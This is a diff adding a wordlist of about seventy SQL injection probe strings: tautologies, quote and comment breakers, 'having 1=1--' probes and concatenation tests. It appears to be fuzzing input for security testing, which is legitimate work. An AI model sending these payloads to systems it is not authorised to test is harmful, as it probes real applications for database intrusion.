@@ -1,0 +1,70 @@
+'
+"
+/
+/*
+#
+)
+(
+)'
+('
+and 1=1
+and 1=2
+and 1>2
+and 1<2
+bi' 'ke
+1’ or ‘1’=’1
+value’ or ‘1’=’2
+1’ and ‘1’=’2
+1’ or ‘ab’=‘a’+’b
+1’ or ‘ab’=‘a’’b
+1’ or ‘ab’=‘a’||’b
+1’) or (‘1’=’1
+value’) or (‘1’=’2
+1’) and (‘1’=’2
+1’) or (‘ab’=‘a’+’b
+1’) or (‘ab’=‘a’’b
+1’) or (‘ab’=‘a’||’b
+value' OR
+value' OR 5=5 OR 's'='0
+value' AND 5=5 OR 's'='0
+value' OR 5=0 OR 's'='0
+value' AND 5=0 OR 's'='0
+0+value
+value AND 5=5
+value AND 5=0
+value OR 5=5 OR 4=0
+value OR 5=0 OR 4=0
+WF’SQL”Probe;A--B
+' having 1=1--
+1 having 1=1--
+\' having 1=1--
+) having 1=1--
+%a5' having 1=1--
+|vol
+' | 'vol
+" | "vol ||vol
+' + " + '
+' + ‘somechars
+somechars’ + ‘
+somechars’ || ‘
+‘ || ‘somechars
+‘ || ‘
+‘;
+;
+\”
+“’
+1+1
+value + 0
+1 or 1=1
+value or 1=2
+1 and 1=2
+1 or ‘ab’= ‘a’+‘b’
+1 or ‘ab’=‘a’’b’
+1 or ‘ab’=‘a’||‘b’
+3-1
+1) or (1=1
+value) or (1=2
+1) and (1=2
+1) or (‘ab’ = ‘a’+‘b’
+1) or (‘ab’=‘a’ ‘b
+1) or (‘ab’=‘a’||‘b’
